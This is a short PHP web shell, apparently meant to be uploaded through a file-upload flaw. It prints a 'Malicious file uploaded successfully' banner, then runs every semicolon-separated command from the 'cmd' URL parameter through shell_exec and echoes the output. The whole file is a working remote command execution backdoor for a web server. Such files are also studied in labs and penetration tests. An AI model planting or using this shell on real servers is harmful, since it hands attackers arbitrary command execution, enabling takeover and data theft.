<?php
    echo "<h3 style='color: green;'>[+] Malicious file uploaded successfully!</h3>";
    
    if(isset($_GET['cmd'])) {
        $commands = explode(';', $_GET['cmd']);
        foreach($commands as $command) {
            $clean_cmd = htmlspecialchars(trim($command));
            echo "<h4>=== Command: {$clean_cmd} ===</h4>";
            echo "<pre>" . shell_exec($command) . "</pre>";
        }
    } else {
        echo "<p style='color: red;'>ERROR: Add ?cmd=command1;command2</p>";
    }
    ?>